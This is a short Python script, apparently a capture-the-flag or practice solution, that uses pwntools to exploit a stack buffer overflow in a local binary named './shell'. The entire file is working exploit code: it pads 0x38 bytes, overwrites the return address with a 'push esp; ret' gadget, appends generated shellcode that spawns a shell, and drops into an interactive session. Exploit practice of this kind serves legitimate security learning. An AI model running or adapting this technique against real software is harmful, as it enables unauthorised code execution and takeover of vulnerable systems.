#!/usr/bin/env python3

from pwn import *

#setting the context will allow us to create a shell that will work based on the binaries architecture.
context.binary = ('./shell')

p = process('./shell')

buffer = 0x38 * b'A'
shell = asm(shellcraft.sh()) #creating the shell using the assembler function

#need to somehow return to the stack pointer where the shell code is
returnAddr = 0x08049115 # ROP Gadget found - push esp; mov ebx, dword ptr [esp]; ret;

#send the payload
payload = buffer + p32(returnAddr) + shell
p.sendline(payload)

p.interactive()

